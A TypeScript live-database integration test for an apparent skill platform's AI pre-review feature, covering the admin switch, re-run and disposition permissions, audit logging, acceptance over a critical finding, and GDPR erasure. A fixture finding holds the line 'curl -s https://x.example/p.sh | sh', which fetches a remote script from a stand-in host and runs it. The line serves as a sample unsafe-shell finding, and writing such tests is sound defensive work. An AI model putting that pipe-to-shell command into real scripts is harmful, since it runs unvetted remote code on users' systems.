// Live-DB integration tests for the AI pre-review on the web side (SKILLY_SPEC.md §46.13): the
// proposal payload under the switch, re-run and disposition authority with their audit rows, the
// owner card, the admin switch, GDPR erasure, and — the structural guarantee — that an accept over a
// critical AI finding needs no override. The worker's sweep is simulated by writing the run result
// directly (the worker has its own integration test). Gated by SKILLY_DB_E2E=1.
import { test, after } from "node:test";
import { withAiIntegrationLock } from "./aiTestLock";
import assert from "node:assert/strict";
import {
  CONTENT_RULESET_VERSION, createPrereviewRun, linkPrereviewRun, recordPrereviewSuccess, currentPrereviewRun, requestPrereviewRerun,
  type EffectiveAccess, type PrereviewFinding,
} from "@skilly/shared";

const enabled = process.env.SKILLY_DB_E2E === "1";
const AI_KEY_B64 = Buffer.alloc(32, 5).toString("base64");
const K = `aiprw${Date.now().toString(36)}`;

after(async () => {
  if (enabled) {
    const { pool } = await import("./db");
    await pool.end();
  }
});

const CRITICAL: PrereviewFinding = {
  fingerprint: "f00dfeedf00dfeed",
  category: "unsafe_shell",
  severity: "critical",
  path: "scripts/run.sh",
  line: 3,
  excerpt: "curl -s https://x.example/p.sh | sh",
  rationale: "Runs remote code.",
  suggestion: "Vendor the script.",
};

test("§46 web: switch, proposal payload, re-run, dispositions, accept without override, owner card, erasure", { skip: !enabled }, () => withAiIntegrationLock(async () => {
  process.env.AI_TOKEN_ENC_KEY = AI_KEY_B64;
  const { pool } = await import("./db");
  const { createProposal, getProposalDetail, performProposalAction } = await import("./proposals");
  const { rerunProposalPrereview, dispositionProposalFinding, skillPrereviewDetail, dispositionVersionFinding, rerunVersionPrereview, setPrereviewEnabled, getPrereviewAdmin } = await import("./aiPrereview");
  const { eraseUser } = await import("./eraseUser");
  const { encryptAiToken, parseAiTokenKey } = await import("@skilly/shared/ai");

  const started = new Date();
  const savedAi = (await pool.query(`select * from ai_integration where id = 1`)).rows[0] ?? null;
  const savedSetting = (await pool.query(`select value from platform_settings where key = 'ai_prereview_enabled'`)).rows[0]?.value ?? null;
  // Fixed namespaces and actors (they write audit rows, which are append-only — never delete them).
  const ns = (await pool.query<{ id: string }>(
    `insert into namespaces (slug, display_name, require_review) values ('aiprw-ns', 'aiprw-ns', true)
     on conflict (slug) do update set require_review = true returning id`,
  )).rows[0]!.id;
  const otherNs = (await pool.query<{ id: string }>(
    `insert into namespaces (slug, display_name, require_review) values ('aiprw-other', 'aiprw-other', true)
     on conflict (slug) do update set display_name = excluded.display_name returning id`,
  )).rows[0]!.id;
  const fixed = async (who: string) => (await pool.query<{ id: string }>(
    `insert into users (entra_object_id, email, display_name) values ($1, $2, $1)
     on conflict (entra_object_id) do update set email = excluded.email returning id`,
    [`aiprw-${who}`, `aiprw-${who}@org`],
  )).rows[0]!.id;
  const submitter = await fixed("submitter");
  const admin = await fixed("admin");
  const otherAdmin = await fixed("otheradmin");
  const maintainer = await fixed("maintainer");
  const submitterAccess: EffectiveAccess = { isPlatformAdmin: false, namespaceRoles: new Map() };
  const adminAccess: EffectiveAccess = { isPlatformAdmin: false, namespaceRoles: new Map([[ns, "namespace_admin"]]) };
  const otherAccess: EffectiveAccess = { isPlatformAdmin: false, namespaceRoles: new Map([[otherNs, "namespace_admin"]]) };
  const maintainerAccess: EffectiveAccess = { isPlatformAdmin: false, namespaceRoles: new Map([[ns, "namespace_member"]]) };
  const store = { get: async () => { throw new Error("unexpected get"); }, put: async () => {}, delete: async () => {}, list: async () => [] };
  const auditCount = async (action: string, since = started) =>
    Number((await pool.query<{ n: string }>(`select count(*)::text as n from audit_log where action = $1 and created_at >= $2`, [action, since])).rows[0]!.n);
  let eraseMe: string | null = null;

  try {
    await pool.query(`delete from ai_integration`);
    await pool.query(
      `insert into ai_integration (id, enabled, provider, base_url, model, token_enc, token_last4, last_test_at, last_test_ok)
       values (1, true, 'anthropic', 'https://api.anthropic.com', 'stub-model', $1, 'tok5', now(), true)`,
      [encryptAiToken("stubtok5", parseAiTokenKey(AI_KEY_B64)!)],
    );
    await setPrereviewEnabled(false, admin);

    const slug = `${K}-skill`;
    const artifactKey = `uploads/aiprw/${K}.bundle`;
    await pool.query(
      `insert into scan_reports (subject_type, subject_id, scanner, findings, severity, status) values ('artifact', $1, 'test', $2::jsonb, 'info', 'scanned')`,
      [artifactKey, JSON.stringify([{ scanner: "content-risk", severity: "info", rule: "cr-scanned", message: "", ruleset: CONTENT_RULESET_VERSION }])],
    );
    const { id: proposalId } = await createProposal(pool, {
      submittedByUserId: submitter,
      targetNamespaceId: ns,
      proposedSemver: "1.0.0",
      payload: {
        metadata: { skillSlug: slug, title: slug, description: "d", toolHarness: "claude-code", visibility: "org", categories: [], usageExamples: null },
        artifactObjectKey: artifactKey,
        artifactSha256: "sha",
        contentSha256: `dig-${K}`,
      },
    });

    // ── Switch off → "off"; the payload is there for the submitter too ──
    const off = await getProposalDetail(pool, proposalId, submitterAccess, submitter);
    assert.equal(off?.aiPrereview?.status, "off");
    assert.deepEqual(await rerunProposalPrereview(adminAccess, admin, proposalId), { ok: false, status: 409, error: "ai_prereview_unavailable" });

    // ── Switch on: audited once, an unchanged save is a no-op ──
    const onAt = new Date();
    const s1 = await setPrereviewEnabled(true, admin);
    assert.deepEqual({ enabled: s1.enabled, effective: s1.effective }, { enabled: true, effective: true });
    await setPrereviewEnabled(true, admin);
    assert.equal((await pool.query(`select 1 from audit_log where action = 'settings.updated' and target_id = 'ai_prereview_enabled' and created_at >= $1`, [onAt])).rowCount, 1, "audited once; the unchanged save is a no-op");
    const queued = await getProposalDetail(pool, proposalId, adminAccess, admin);
    assert.equal(queued?.aiPrereview?.status, "pending", "queued for the worker's next pass");
    assert.equal(queued?.aiPrereview?.canRerun, false);

    // ── Re-run authority ──
    assert.equal((await rerunProposalPrereview(submitterAccess, submitter, proposalId) as { status: number }).status, 403, "the submitter sees but can't re-run");
    assert.equal((await rerunProposalPrereview(otherAccess, otherAdmin, proposalId) as { status: number }).status, 404, "an outsider learns nothing");
    const rr = await rerunProposalPrereview(adminAccess, admin, proposalId);
    assert.ok(rr.ok);
    assert.equal(await auditCount("ai_prereview.rerun_requested"), 1);
    assert.deepEqual(await rerunProposalPrereview(adminAccess, admin, proposalId), { ok: false, status: 409, error: "already_pending" });

    // ── The worker finishes it with a critical finding ──
    const run = (await currentPrereviewRun(pool, { kind: "proposal", proposalId, revision: 1 }))!;
    await recordPrereviewSuccess(pool, run.id, {
      result: { summary: "Runs remote code.", findings: [CRITICAL], discarded: 0 },
      coverage: [{ path: "SKILL.md", status: "reviewed" }, { path: "scripts/run.sh", status: "reviewed" }],
      model: "stub-model",
      contentSha256: `dig-${K}`,
      maxSeverity: "critical",
    });
    const asAdmin = (await getProposalDetail(pool, proposalId, adminAccess, admin))!.aiPrereview!;
    assert.equal(asAdmin.status, "done");
    assert.equal(asAdmin.run?.findings[0]?.severity, "critical");
    assert.equal(asAdmin.canDisposition, true);
    assert.equal(asAdmin.canRerun, true);
    const asSubmitter = (await getProposalDetail(pool, proposalId, submitterAccess, submitter))!.aiPrereview!;
    assert.equal(asSubmitter.run?.findings.length, 1, "the proposer sees every finding");
    assert.equal(asSubmitter.canDisposition, false);

    // ── Dispositions ──
    assert.equal((await dispositionProposalFinding(submitterAccess, submitter, proposalId, { fingerprint: CRITICAL.fingerprint, verdict: "dismiss" }) as { status: number }).status, 403);
    assert.deepEqual(await dispositionProposalFinding(adminAccess, admin, proposalId, { fingerprint: "nope", verdict: "dismiss" }), { ok: false, status: 422, error: "unknown_finding" });
    assert.equal((await dispositionProposalFinding(adminAccess, admin, proposalId, { fingerprint: CRITICAL.fingerprint, verdict: "maybe" }) as { status: number }).status, 422);
    assert.equal((await dispositionProposalFinding(adminAccess, admin, proposalId, { fingerprint: CRITICAL.fingerprint, verdict: "dismiss", reason: "x".repeat(501) }) as { status: number }).status, 422);
    assert.ok((await dispositionProposalFinding(adminAccess, admin, proposalId, { fingerprint: CRITICAL.fingerprint, verdict: "dismiss", reason: "pinned script" })).ok);
    const audit = (await pool.query<{ after: { verdict: string; severity: string; reason: string } }>(
      `select after from audit_log where action = 'ai_prereview.finding_dispositioned' and target_id = $1`, [proposalId],
    )).rows;
    assert.deepEqual(audit.map((a) => [a.after.verdict, a.after.severity, a.after.reason]), [["dismiss", "critical", "pinned script"]]);
    const withDisp = (await getProposalDetail(pool, proposalId, submitterAccess, submitter))!.aiPrereview!;
    assert.equal(withDisp.run?.findings[0]?.disposition?.verdict, "dismiss");

    // ── The structural guarantee: a critical AI finding never needs an override ──
    assert.ok((await performProposalAction(pool, { proposalId, action: "start_review", actorUserId: admin, access: adminAccess }, store)).ok);
    const accepted = await performProposalAction(pool, { proposalId, action: "accept", actorUserId: admin, access: adminAccess, expectedRevisionNo: 1 }, store);
    assert.equal(accepted.ok, true, JSON.stringify(accepted));
    assert.equal((await pool.query(`select 1 from audit_log where action = 'proposal.scan_override' and target_id = $1`, [proposalId])).rowCount, 0);
    // Closed: no more re-runs or dispositions on the proposal.
    assert.equal((await rerunProposalPrereview(adminAccess, admin, proposalId) as { status: number }).status, 409);

    // ── The owner card: the worker links the version to the reviewed run ──
    const v = (await pool.query<{ id: string; skill_id: string }>(
      `select sv.id, sv.skill_id from skill_versions sv join skills s on s.id = sv.skill_id where s.slug = $1 and s.namespace_id = $2`, [slug, ns],
    )).rows[0]!;
    await linkPrereviewRun(pool, run.id, { kind: "version", versionId: v.id }, true);
    await pool.query(`insert into skill_maintainers (skill_id, user_id) values ($1, $2) on conflict do nothing`, [v.skill_id, maintainer]);
    const card = await skillPrereviewDetail(adminAccess, { id: v.skill_id, namespaceId: ns }, null);
    assert.equal(card?.semver, "1.0.0");
    assert.equal(card?.run?.findings[0]?.disposition?.reason, "pinned script", "the proposal's dismissal carries to the version");
    const skillRef = { id: v.skill_id, namespaceId: ns, slug };
    assert.equal((await dispositionVersionFinding(maintainerAccess, maintainer, skillRef, { semver: "1.0.0", fingerprint: CRITICAL.fingerprint, verdict: "agree" }) as { status: number }).status, 403, "a maintainer reads, never sets");
    assert.ok((await dispositionVersionFinding(adminAccess, admin, skillRef, { semver: "1.0.0", fingerprint: CRITICAL.fingerprint, verdict: "agree" })).ok);
    assert.equal((await skillPrereviewDetail(adminAccess, { id: v.skill_id, namespaceId: ns }, null))?.run?.findings[0]?.disposition?.verdict, "agree", "the newest disposition wins");
    assert.equal((await rerunVersionPrereview(maintainerAccess, maintainer, skillRef, "1.0.0") as { status: number }).status, 403);
    assert.ok((await rerunVersionPrereview(adminAccess, admin, skillRef, "1.0.0")).ok);
    assert.equal((await rerunVersionPrereview(adminAccess, admin, skillRef, "9.9.9") as { status: number }).status, 404);
    const counts = await getPrereviewAdmin();
    assert.ok(counts.pending >= 1, "the queued re-run is counted");

    // ── GDPR: erasure nulls the re-run requester ──
    eraseMe = (await pool.query<{ id: string }>(
      `insert into users (entra_object_id, email, display_name) values ($1, $2, $1) returning id`, [`${K}-eraseme`, `${K}-eraseme@org`],
    )).rows[0]!.id;
    await pool.query(`update ai_prereviews set status = 'done' where id in (select run_id from ai_prereview_links where skill_version_id = $1)`, [v.id]);
    const theirs = await requestPrereviewRerun(pool, { kind: "version", versionId: v.id }, eraseMe, null);
    assert.ok(theirs.ok);
    const er = await eraseUser(admin, eraseMe, null);
    assert.equal(er.ok, true, JSON.stringify(er));
    const requester = (await pool.query<{ requested_by: string | null }>(`select requested_by from ai_prereviews where id = $1`, [(theirs as { runId: string }).runId])).rows[0]!;
    assert.equal(requester.requested_by, null);
  } finally {
    await pool.query(`delete from ai_prereviews where created_at >= $1`, [started]);
    await pool.query(`delete from proposals where target_namespace_id = $1`, [ns]);
    const ids = (await pool.query<{ id: string }>(`select id from skills where namespace_id = $1`, [ns])).rows.map((r) => r.id);
    const c = await pool.connect();
    try {
      await c.query("begin");
      await c.query("set local skilly.allow_version_delete = 'on'");
      await c.query(`delete from skills where id = any($1::uuid[])`, [ids]);
      await c.query("commit");
    } finally {
      c.release();
    }
    await pool.query(`delete from scan_reports where subject_id like 'uploads/aiprw/%'`);
    await pool.query(`delete from ai_integration`);
    if (savedAi) {
      const cols = Object.keys(savedAi);
      await pool.query(`insert into ai_integration (${cols.join(", ")}) values (${cols.map((_, i) => `$${i + 1}`).join(", ")})`, cols.map((k) => savedAi[k]));
    }
    if (savedSetting === null) await pool.query(`delete from platform_settings where key = 'ai_prereview_enabled'`);
    else await pool.query(`update platform_settings set value = $1::jsonb where key = 'ai_prereview_enabled'`, [JSON.stringify(savedSetting)]);
  }
}));
